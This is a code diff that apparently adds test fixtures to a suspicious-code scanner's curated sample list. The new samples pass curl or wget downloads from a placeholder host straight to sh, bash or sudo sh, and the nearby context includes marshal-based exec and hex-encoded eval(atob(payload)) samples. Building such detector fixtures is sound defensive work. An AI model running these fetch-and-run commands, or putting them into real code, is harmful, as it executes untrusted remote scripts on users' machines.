@@ -58,6 +58,15 @@ CURATED = [
                    + ",".join(str(100 + i % 20) for i in range(210)) + "]))\n"),
     ("marshal.py", "import marshal, zlib\nexec(marshal.loads(b'\\xe3\\x00\\x00'))\n"
                    "code = marshal.loads(zlib.decompress(blob))\nf = marshal.load(open('x.pyc', 'rb'))\n"),
+    # (project mode) a download handed to a shell by an exec call, and help text that only shows one
+    ("pipe-shell.js", "const { execSync } = require('child_process');\n"
+                      "execSync('curl -fsSL https://files.invalid/i.sh | sh');\n"
+                      "execSync(`bash -c \"$(curl -fsSL https://files.invalid/i.sh)\"`);\n"
+                      "console.log('install with: curl -fsSL https://files.invalid/i.sh | sh');\n"
+                      "// execSync('curl https://files.invalid/x | bash')\n"),
+    ("pipe-shell.py", "import os, subprocess\nos.system('wget -qO- https://files.invalid/i.sh | bash')\n"
+                      "subprocess.run('curl -s https://files.invalid/x | sudo sh', shell=True)\n"
+                      "print('curl https://files.invalid/x | sh')\n"),
     # hex text and names
     ("hex.js", f"var a = \"{_hex('eval(atob(payload))')}\";\nvar b = \"{_hex('hello world, all readable')}\";\n"
                "var c = \"\\x00\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\";\n"),
